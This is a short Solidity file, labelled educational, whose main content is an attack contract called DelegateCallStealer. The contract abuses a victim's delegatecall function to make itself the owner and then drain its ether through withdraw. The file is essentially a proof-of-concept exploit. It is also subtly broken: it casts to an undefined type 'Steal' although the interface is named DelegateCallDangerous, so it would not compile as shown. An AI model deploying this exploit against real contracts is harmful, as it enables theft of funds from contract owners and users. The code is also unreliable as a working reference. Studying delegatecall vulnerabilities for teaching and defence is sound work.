/* 


    THIS IS FOR EDUCATIONAL PURPOSES ONLY
    DO NOT USE THIS CODE IN PRODUCTION


*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface DelegateCallDangerous {

    function delegateFunction(address delegate, bytes memory args) external;
    function withdraw() external;

}

contract DelegateCallStealer {

    address private owner;

    function changeOwner(address newOwner) external {
        owner = newOwner;
    }

    function startDelegate(address stealAddress) external {
        Steal start = Steal(stealAddress);
        start.delegateFunction(address(this), abi.encodeWithSignature("changeOwner(address)", address(this)));
        start.withdraw();
        require(address(this).balance == 10 ether);
    }

    // ----------------- VIEW FUNCTION -----------------

    // @notice - getContractBalance returns the balance of the contract
    function getContractBalance() external view returns(uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}



